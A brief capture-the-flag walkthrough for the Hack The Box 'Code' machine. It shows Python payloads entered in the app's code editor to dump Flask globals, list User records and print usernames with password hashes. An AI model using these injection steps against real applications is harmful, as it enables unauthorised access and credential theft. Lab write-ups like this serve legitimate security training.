
if you have [access to a code editor](https://app.hackthebox.com/machines/Code) then run the following command to show items from db.

```python
raise Exception(globals())
```
`raise Exception(globals())` and got a detailed dump of the app's global variables and environment. This output shows the full context of the running Flask app, including:

- The Flask app instance (app)
- The database object (db)
- The SQLAlchemy models like User and Code
- Various Flask functions and modules like request, render_template, os, hashlib, etc.

Find users using 
```python
raise Exception(User.query.all())
```

Get password hashes using the following.
```python
print([(user.id, user.username, user.password) for user in User.query.all()])
```